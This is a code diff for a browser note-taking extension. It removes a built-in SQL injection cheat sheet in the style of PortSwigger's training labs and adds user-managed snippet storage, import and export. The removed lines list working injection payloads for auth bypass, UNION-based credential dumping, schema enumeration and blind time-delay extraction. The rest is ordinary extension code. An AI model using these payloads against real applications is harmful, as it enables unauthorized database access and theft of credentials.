@@ -3,86 +3,9 @@
 
 'use strict';
 
-// ---------------------------------------------------------------------------
-// Built-in SQL injection cheat sheet (PortSwigger Web Security Academy style).
-// Click a payload to copy it. Edit/extend freely.
-// ---------------------------------------------------------------------------
-var CHEAT_SHEET = [
-  {
-    category: 'Detect & confirm',
-    items: [
-      { p: "'", d: 'Break the query — look for an error' },
-      { p: "''", d: 'Two quotes — error disappears? confirms SQLi' },
-      { p: "' OR '1'='1", d: 'Always-true condition' },
-      { p: "' OR 1=1-- -", d: 'Always true, comment out the rest' },
-      { p: "admin'-- -", d: 'Auth bypass: log in as admin' }
-    ]
-  },
-  {
-    category: 'Comments',
-    items: [
-      { p: '-- -', d: 'MySQL/MSSQL/Postgres line comment (note the space)' },
-      { p: '#', d: 'MySQL line comment' },
-      { p: '/*comment*/', d: 'Inline comment' },
-      { p: '--', d: 'Oracle / MSSQL line comment' }
-    ]
-  },
-  {
-    category: 'UNION — column count',
-    items: [
-      { p: "' ORDER BY 1-- -", d: 'Increment until it errors → column count' },
-      { p: "' UNION SELECT NULL-- -", d: 'Add NULLs until no error' },
-      { p: "' UNION SELECT NULL,NULL-- -", d: '2 columns' },
-      { p: "' UNION SELECT NULL,NULL,NULL-- -", d: '3 columns' },
-      { p: "' UNION SELECT NULL,NULL,NULL FROM dual-- -", d: 'Oracle needs FROM dual' }
-    ]
-  },
-  {
-    category: 'UNION — find text column',
-    items: [
-      { p: "' UNION SELECT 'a',NULL,NULL-- -", d: 'Swap each NULL for a string' },
-      { p: "' UNION SELECT username, password FROM users-- -", d: 'Dump creds (2 cols)' },
-      { p: "' UNION SELECT username||'~'||password FROM users-- -", d: 'Concat into one col (Oracle/Postgres)' },
-      { p: "' UNION SELECT CONCAT(username,':',password) FROM users-- -", d: 'Concat (MySQL)' }
-    ]
-  },
-  {
-    category: 'DB version',
-    items: [
-      { p: "' UNION SELECT @@version-- -", d: 'MySQL / MSSQL' },
-      { p: "' UNION SELECT version()-- -", d: 'PostgreSQL' },
-      { p: "' UNION SELECT banner FROM v$version-- -", d: 'Oracle' },
-      { p: "' UNION SELECT sqlite_version()-- -", d: 'SQLite' }
-    ]
-  },
-  {
-    category: 'List tables & columns',
-    items: [
-      { p: "' UNION SELECT table_name,NULL FROM information_schema.tables-- -", d: 'MySQL/MSSQL/Postgres' },
-      { p: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -", d: 'Columns of a table' },
-      { p: "' UNION SELECT table_name,NULL FROM all_tables-- -", d: 'Oracle tables' },
-      { p: "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -", d: 'Oracle columns' }
-    ]
-  },
-  {
-    category: 'Blind — conditional',
-    items: [
-      { p: "' AND '1'='1", d: 'True condition (page normal)' },
-      { p: "' AND '1'='2", d: 'False condition (page differs)' },
-      { p: "' AND (SELECT 'a' FROM users WHERE username='administrator')='a", d: 'Confirm row exists' },
-      { p: "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a", d: 'Extract char-by-char' }
-    ]
-  },
-  {
-    category: 'Blind — time delay',
-    items: [
-      { p: "'; SELECT SLEEP(5)-- -", d: 'MySQL' },
-      { p: "'; SELECT pg_sleep(5)-- -", d: 'PostgreSQL' },
-      { p: "'; WAITFOR DELAY '0:0:5'-- -", d: 'MSSQL' },
-      { p: "' || (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual)-- -", d: 'Oracle time-based' }
-    ]
-  }
-];
+// Snippets are fully user-owned and stored in chrome.storage.local under
+// `snippets`. Ready-made packs can be imported from JSON files (see the
+// cheatsheets/ folder in the repo). Each snippet: { id, label, text, category }.
 
 // ---------------------------------------------------------------------------
 // Utilities
@@ -301,85 +224,276 @@ function refreshNotes() {
 }
 
 // ---------------------------------------------------------------------------
-// Cheat sheet
+// Snippets (user-owned cheat sheet)
 // ---------------------------------------------------------------------------
-function renderCheatSheet(filter) {
+var snippets = [];
+var editingSnippetId = null;
+
+function loadSnippets(cb) {
+  chrome.storage.local.get(['snippets'], function (result) {
+    snippets = Array.isArray(result.snippets) ? result.snippets : [];
+    if (cb) cb();
+  });
+}
+
+function persistSnippets(cb) {
+  chrome.storage.local.set({ snippets: snippets }, function () { if (cb) cb(); });
+}
+
+function renderSnippets(filter) {
   var listEl = document.getElementById('cheatList');
+  var emptyEl = document.getElementById('cheatEmpty');
   listEl.textContent = '';
-  var q = (filter || '').toLowerCase();
 
-  CHEAT_SHEET.forEach(function (cat) {
-    var matches = cat.items.filter(function (it) {
-      if (!q) return true;
-      return (it.p + ' ' + it.d + ' ' + cat.category).toLowerCase().indexOf(q) !== -1;
-    });
-    if (matches.length === 0) return;
+  if (snippets.length === 0) {
+    emptyEl.hidden = false;
+    return;
+  }
+  emptyEl.hidden = true;
 
+  var q = (filter || '').trim().toLowerCase();
+  var items = snippets.filter(function (s) {
+    if (!q) return true;
+    return ((s.text || '') + ' ' + (s.label || '') + ' ' + (s.category || '')).toLowerCase().indexOf(q) !== -1;
+  });
+
+  if (items.length === 0) {
+    var none = document.createElement('div');
+    none.className = 'empty';
+    none.textContent = 'No snippets match “' + filter + '”.';
+    listEl.appendChild(none);
+    return;
+  }
+
+  // Group by category (blank category grouped under "Snippets").
+  var groups = {};
+  var order = [];
+  items.forEach(function (s) {
+    var cat = (s.category || '').trim() || 'Snippets';
+    if (!groups[cat]) { groups[cat] = []; order.push(cat); }
+    groups[cat].push(s);
+  });
+
+  order.forEach(function (cat) {
     var title = document.createElement('div');
     title.className = 'cheat-cat-title';
-    title.textContent = cat.category;
+    title.textContent = cat;
     listEl.appendChild(title);
-
-    matches.forEach(function (it) {
-      var row = document.createElement('div');
-      row.className = 'cheat-item';
-      row.title = 'Click to copy';
-
-      var textWrap = document.createElement('div');
-      textWrap.style.flex = '1';
-
-      var payload = document.createElement('span');
-      payload.className = 'cheat-payload';
-      payload.textContent = it.p;
-
-      var desc = document.createElement('span');
-      desc.className = 'cheat-desc';
-      desc.textContent = it.d;
-
-      textWrap.appendChild(payload);
-      textWrap.appendChild(desc);
-
-      var icon = document.createElement('span');
-      icon.className = 'cheat-copy-icon';
-      icon.textContent = '⧉';
-
-      row.appendChild(textWrap);
-      row.appendChild(icon);
-
-      row.onclick = function () {
-        copyToClipboard(it.p).then(function () {
-          icon.textContent = '✓';
-          row.classList.add('copied');
-          setTimeout(function () { icon.textContent = '⧉'; row.classList.remove('copied'); }, 1000);
-        });
-      };
-
-      listEl.appendChild(row);
-    });
+    groups[cat].forEach(function (s) { listEl.appendChild(buildSnippetRow(s)); });
   });
+}
+
+function buildSnippetRow(s) {
+  var row = document.createElement('div');
+  row.className = 'cheat-item';
+
+  var textWrap = document.createElement('div');
+  textWrap.className = 'cheat-textwrap';
+  textWrap.title = 'Click to copy';
+
+  var payload = document.createElement('span');
+  payload.className = 'cheat-payload';
+  payload.textContent = s.text;
+
+  textWrap.appendChild(payload);
+
+  if (s.label) {
+    var desc = document.createElement('span');
+    desc.className = 'cheat-desc';
+    desc.textContent = s.label;
+    textWrap.appendChild(desc);
+  }
+
+  var actions = document.createElement('div');
+  actions.className = 'cheat-actions';
+
+  var copyIcon = document.createElement('button');
+  copyIcon.className = 'cheat-mini';
+  copyIcon.title = 'Copy';
+  copyIcon.textContent = '⧉';
+
+  var editIcon = document.createElement('button');
+  editIcon.className = 'cheat-mini';
+  editIcon.title = 'Edit';
+  editIcon.textContent = '✎';
+
+  var delIcon = document.createElement('button');
+  delIcon.className = 'cheat-mini cheat-mini-del';
+  delIcon.title = 'Delete';
+  delIcon.textContent = '×';
+
+  actions.appendChild(copyIcon);
+  actions.appendChild(editIcon);
+  actions.appendChild(delIcon);
+
+  row.appendChild(textWrap);
+  row.appendChild(actions);
+
+  function doCopy() {
+    copyToClipboard(s.text).then(function () {
+      copyIcon.textContent = '✓';
+      row.classList.add('copied');
+      setTimeout(function () { copyIcon.textContent = '⧉'; row.classList.remove('copied'); }, 1000);
+    });
+  }
+
+  textWrap.onclick = doCopy;
+  copyIcon.onclick = function (e) { e.stopPropagation(); doCopy(); };
+  editIcon.onclick = function (e) { e.stopPropagation(); openSnippetEditor(s); };
+  delIcon.onclick = function (e) {
+    e.stopPropagation();
+    snippets = snippets.filter(function (n) { return n.id !== s.id; });
+    persistSnippets(function () { renderSnippets(currentCheatFilter()); });
+  };
+
+  return row;
+}
+
+function currentCheatFilter() {
+  var el = document.getElementById('cheatSearch');
+  return el ? el.value : '';
+}
+
+function openSnippetEditor(snippet) {
+  editingSnippetId = snippet ? snippet.id : null;
+  document.getElementById('snipLabel').value = snippet ? (snippet.label || '') : '';
+  document.getElementById('snipCategory').value = snippet ? (snippet.category || '') : '';
+  document.getElementById('snipText').value = snippet ? (snippet.text || '') : '';
+  document.getElementById('snippetEditor').hidden = false;
+  document.getElementById('snipText').focus();
+}
+
+function closeSnippetEditor() {
+  editingSnippetId = null;
+  document.getElementById('snippetEditor').hidden = true;
+}
+
+function saveSnippet() {
+  var text = document.getElementById('snipText').value.trim();
+  if (!text) { document.getElementById('snipText').focus(); return; }
+  var label = document.getElementById('snipLabel').value.trim();
+  var category = document.getElementById('snipCategory').value.trim();
+
+  if (editingSnippetId) {
+    var existing = null;
+    for (var i = 0; i < snippets.length; i++) {
+      if (snippets[i].id === editingSnippetId) { existing = snippets[i]; break; }
+    }
+    if (existing) { existing.text = text; existing.label = label; existing.category = category; }
+  } else {
+    snippets.unshift({ id: newSnippetId(), text: text, label: label, category: category });
+  }
+  persistSnippets(function () {
+    closeSnippetEditor();
+    renderSnippets(currentCheatFilter());
+  });
+}
+
+function newSnippetId() {
+  return 'snip_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+}
+
+// Normalize an incoming snippet (from an imported file) into our shape.
+function normalizeSnippet(raw) {
+  if (!raw) return null;
+  // Support {text,label,category} and the built-in pack shape {p,d,category}.
+  var text = raw.text != null ? raw.text : raw.p;
+  if (text == null || String(text).trim() === '') return null;
+  return {
+    id: newSnippetId(),
+    text: String(text),
+    label: String(raw.label != null ? raw.label : (raw.d != null ? raw.d : '')),
+    category: String(raw.category != null ? raw.category : '')
+  };
+}
+
+function importSnippets(file) {
+  var reader = new FileReader();
+  reader.onload = function () {
+    var data;
+    try { data = JSON.parse(reader.result); }
+    catch (e) { showCheatMsg('Invalid JSON file.', true); return; }
+
+    // Accept: raw array, {snippets:[...]}, or a pack with {items:[...]}.
+    var incoming = Array.isArray(data) ? data
+      : (Array.isArray(data.snippets) ? data.snippets
+        : (Array.isArray(data.items) ? data.items : null));
+
+    if (!incoming) { showCheatMsg('No snippets found in that file.', true); return; }
+
+    // Dedup against existing by text+label.
+    var seen = {};
+    snippets.forEach(function (s) { seen[(s.text || '') + ' ' + (s.label || '')] = true; });
+
+    var added = 0;
+    incoming.forEach(function (raw) {
+      var norm = normalizeSnippet(raw);
+      if (!norm) return;
+      var key = norm.text + ' ' + norm.label;
+      if (seen[key]) return;
+      seen[key] = true;
+      snippets.push(norm);
+      added++;
+    });
+
+    persistSnippets(function () {
+      renderSnippets(currentCheatFilter());
+      showCheatMsg('Imported ' + added + ' snippet(s).', false);
+    });
+  };
+  reader.onerror = function () { showCheatMsg('Could not read the file.', true); };
+  reader.readAsText(file);
+}
+
+function exportSnippets() {
+  var data = {
+    app: 'QuickNote',
+    type: 'cheatsheet',
+    name: 'My snippets',
+    version: 1,
+    exportedAt: new Date().toISOString(),
+    snippets: snippets.map(function (s) {
+      return { text: s.text, label: s.label || '', category: s.category || '' };
+    })
+  };
+  downloadJson(data, 'quicknote-cheatsheet-' + new Date().toISOString().slice(0, 10) + '.json');
+  showCheatMsg('Exported ' + snippets.length + ' snippet(s).', false);
+}
+
+function showCheatMsg(text, isError) {
+  var el = document.getElementById('cheatMsg');
+  el.textContent = text;
+  el.hidden = false;
+  el.classList.toggle('error', !!isError);
+  setTimeout(function () { el.hidden = true; }, 2500);
 }
 
 // ---------------------------------------------------------------------------
 // Backup: export / import
 // ---------------------------------------------------------------------------
+function downloadJson(data, filename) {
+  var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+  var url = URL.createObjectURL(blob);
+  var a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  URL.revokeObjectURL(url);
+}
+
 function exportNotes() {
-  chrome.storage.local.get(['notes', 'global'], function (result) {
+  chrome.storage.local.get(['notes', 'global', 'snippets'], function (result) {
     var data = {
       app: 'QuickNote',
-      version: 2,
+      version: 3,
       exportedAt: new Date().toISOString(),
       notes: result.notes || {},
-      global: result.global || []
+      global: result.global || [],
+      snippets: result.snippets || []
     };
-    var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement('a');
-    a.href = url;
-    a.download = 'quicknote-backup-' + new Date().toISOString().slice(0, 10) + '.json';
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-    URL.revokeObjectURL(url);
+    downloadJson(data, 'quicknote-backup-' + new Date().toISOString().slice(0, 10) + '.json');
     showBackupMsg('Exported successfully.', false);
   });
 }
@@ -422,10 +536,26 @@ function importNotes(file) {
         if (!globalIds[n.id]) { global.push(n); added++; }
       });
 
-      chrome.storage.local.set({ notes: buckets, global: global }, function () {
-        showBackupMsg('Imported ' + added + ' note(s).', false);
+      // Merge snippets if the backup carries them (dedup by text+label).
+      var existingSnips = Array.isArray(result.snippets) ? result.snippets : [];
+      var snipSeen = {};
+      existingSnips.forEach(function (s) { snipSeen[(s.text || '') + ' ' + (s.label || '')] = true; });
+      (Array.isArray(data.snippets) ? data.snippets : []).forEach(function (raw) {
+        var norm = normalizeSnippet(raw);
+        if (!norm) return;
+        var key = norm.text + ' ' + norm.label;
+        if (snipSeen[key]) return;
+        snipSeen[key] = true;
+        existingSnips.push(norm);
+        added++;
+      });
+
+      chrome.storage.local.set({ notes: buckets, global: global, snippets: existingSnips }, function () {
+        showBackupMsg('Imported ' + added + ' item(s).', false);
+        snippets = existingSnips;
         refreshNotes();
         renderStats();
+        renderSnippets(currentCheatFilter());
       });
     });
   };
@@ -460,14 +590,28 @@ document.addEventListener('DOMContentLoaded', function () {
   initTabs();
   renderStats();
   refreshNotes();
-  renderCheatSheet('');
+  loadSnippets(function () { renderSnippets(''); });
 
   document.getElementById('noteSearch').addEventListener('input', function (e) {
     renderNotesList(e.target.value);
   });
+
+  // Snippets (cheat sheet) wiring
   document.getElementById('cheatSearch').addEventListener('input', function (e) {
-    renderCheatSheet(e.target.value);
+    renderSnippets(e.target.value);
   });
+  document.getElementById('addSnippetBtn').addEventListener('click', function () {
+    openSnippetEditor(null);
+  });
+  document.getElementById('snipSave').addEventListener('click', saveSnippet);
+  document.getElementById('snipCancel').addEventListener('click', closeSnippetEditor);
+  document.getElementById('exportCheatBtn').addEventListener('click', exportSnippets);
+  document.getElementById('importCheatFile').addEventListener('change', function (e) {
+    if (e.target.files && e.target.files[0]) importSnippets(e.target.files[0]);
+    e.target.value = '';
+  });
+
+  // Backup wiring
   document.getElementById('exportBtn').addEventListener('click', exportNotes);
   document.getElementById('importFile').addEventListener('change', function (e) {
     if (e.target.files && e.target.files[0]) importNotes(e.target.files[0]);
